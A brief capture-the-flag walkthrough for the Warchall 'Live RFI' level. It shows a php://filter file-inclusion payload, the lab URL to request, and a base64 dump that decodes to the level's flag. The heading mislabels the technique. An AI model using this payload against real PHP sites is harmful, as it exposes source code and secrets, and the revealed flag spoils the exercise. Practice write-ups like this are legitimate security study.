## Level 15 - Warchall: Live RFI (Local File Inclusion)

### Instructions
- Use the following PHP filter to read and encode the content of the "solution.php" file in base64:
   ```php
   php://filter/read=convert.base64-encode/resource=solution.php
   ```

- Access the vulnerable endpoint: 
[https://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php](https://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php)

-  Decode the base64-encoded content [here](https://www.base64decode.org/) to reveal the solution.
> PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K
